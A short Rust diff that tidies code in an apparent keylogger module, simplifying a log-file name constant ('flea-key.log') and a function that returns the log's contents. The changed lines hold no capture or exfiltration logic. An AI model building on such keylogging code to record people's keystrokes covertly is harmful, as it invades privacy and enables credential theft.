@@ -5,7 +5,7 @@ use std::io::Write;
 use std::sync::{Arc, Mutex};
 use std::{thread, time};
 
-pub const KEY_LOGGER_FILE_NAME: &'static str = "flea-key.log";
+pub const KEY_LOGGER_FILE_NAME: &str = "flea-key.log";
 
 pub struct Keylogger
 {
@@ -30,7 +30,7 @@ pub fn get_key_logger_content(path: &String) -> String
     {
         Ok(x) =>
         {
-            x.to_string()
+            x
         },
 
         Err(y) =>
